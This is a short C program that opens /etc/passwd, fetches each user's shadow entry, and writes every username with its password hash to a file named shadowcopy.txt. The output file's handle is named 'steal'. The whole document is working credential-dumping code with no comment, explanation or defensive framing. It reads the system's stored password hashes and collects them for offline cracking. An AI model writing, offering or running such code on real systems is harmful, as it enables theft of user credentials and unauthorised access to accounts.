#include<stdio.h>
#include<pwd.h>
#include<shadow.h>

int main()
{

 FILE* pwd=fopen("/etc/passwd","r");
 FILE* steal=fopen("shadowcopy.txt","w");

 struct passwd* pass;
 struct spwd* shadow;

 while(pass=fgetpwent(pwd))
 {
	 
   shadow = getspnam(pass->pw_name);
   fprintf(steal,"%s",shadow->sp_namp);
   fprintf(steal,":%s \n",shadow->sp_pwdp);

 }

 fclose(pwd);
 fclose(steal);

 return 0;

}
